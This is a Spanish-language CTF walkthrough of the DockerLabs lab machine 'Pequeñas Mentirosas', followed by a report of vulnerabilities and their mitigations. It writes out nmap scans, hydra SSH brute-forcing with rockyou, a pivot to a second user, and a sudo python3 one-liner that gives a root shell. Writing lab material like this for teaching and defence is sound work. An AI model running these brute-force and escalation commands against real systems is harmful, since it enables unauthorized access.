# Pequeñas Mentirosas

> Una pista en la web señala al usuario 'a', al que le saco la contraseña por fuerza bruta SSH con hydra. Desde dentro pivoto al usuario spencer con otra fuerza bruta y escalo a root abusando de sudo sobre python3.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 3 |

**Tags:** `Hydra` · `Fuerza bruta SSH` · `rockyou` · `sudo` · `Python` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
$ nmap -sCV -p22,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

Dos puertos: SSH (22) y un servidor web (80). Empiezo por la web.

## La pista de la web

La web no tiene diseño ni contenido: solo un mensaje.

```bash
$ curl 172.17.0.2
<html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>
```

'La clave para A' apunta a un usuario llamado **a**. El fuzzing web no revela nada más, así que voy directo al SSH.

## Fuerza bruta del usuario 'a'

```bash
$ hydra -l a -P rockyou.txt ssh://172.17.0.2 -t 64
[22][ssh] host: 172.17.0.2   login: a   password: secret
1 of 1 target successfully completed, 1 valid password found
```

> **Nota.** Qué hace cada flag: `-l a` un único usuario · `-P rockyou.txt` la lista de contraseñas (-P fichero; -p sería una sola) · `ssh://172.17.0.2` protocolo y objetivo · `-t 64` 64 intentos en paralelo (con SSH a veces conviene bajarlo si da fallos).

Credenciales **a : secret**. Entro por SSH, pero con este usuario no puedo hacer gran cosa: toca buscar por dónde seguir.

```bash
$ ssh a@172.17.0.2
a@172.17.0.2's password: (secret)
a@mentirosas:~$
```

## Pivote al usuario spencer

Miro qué usuarios del sistema tienen shell.

```bash
$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```

Aparece **spencer**. Le aplico la misma receta: fuerza bruta con hydra.

```bash
$ hydra -l spencer -P rockyou.txt ssh://172.17.0.2 -t 64
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
$ su spencer
Password: (password1)
spencer@mentirosas:~$
```

## Escalada a root · sudo python3

```bash
$ sudo -l
User spencer may run the following commands on mentirosas:
    (ALL) NOPASSWD: /usr/bin/python3
```

spencer puede ejecutar `python3` como root sin contraseña. Según GTFOBins, le pido a Python que lance una bash.

```bash
$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@mentirosas:/home/spencer# whoami
root
```

Máquina Pequeñas Mentirosas completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sobre python3

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** spencer puede ejecutar python3 como root sin contraseña; un one-liner le da shell root (GTFOBins).

**Mitigación.** Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre intérpretes (python, perl, etc.).

### 🟠 ALTA — Contraseñas débiles y SSH sin límite de intentos

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** Los usuarios 'a' y 'spencer' usan contraseñas de diccionario (secret, password1) y el SSH no limita los intentos, así que caen por fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo tras N intentos (fail2ban), MFA y preferir autenticación por clave.

### ⚪ BAJA — Divulgación de un usuario válido en la web

`CWE-200` · A07:2021 – Identification and Authentication Failures

**Impacto.** La web revela la existencia del usuario 'a', dando al atacante un objetivo concreto para la fuerza bruta.

**Mitigación.** No exponer nombres de usuario ni pistas sobre cuentas válidas en respuestas públicas.

---

_Writeup de **Pequeñas Mentirosas** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
